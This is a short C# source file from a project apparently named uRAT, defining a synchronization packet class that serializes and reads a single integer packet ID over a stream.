using System.IO;
using uNet2.Packet;

namespace uRAT.Server.Plugin.Synchronization.Packets
{
    internal class SynchronizationFinalizationPacket : IDataPacket
    {
        public int PacketId
        {
            get { return -3; }
        }

        public void SerializeTo(Stream stream)
        {
            var bw = new BinaryWriter(stream);
            bw.Write(PacketId);
        }

        public void DeserializeFrom(Stream stream)
        {
            var br = new BinaryReader(stream);
            br.ReadInt32();
        }
    }
}
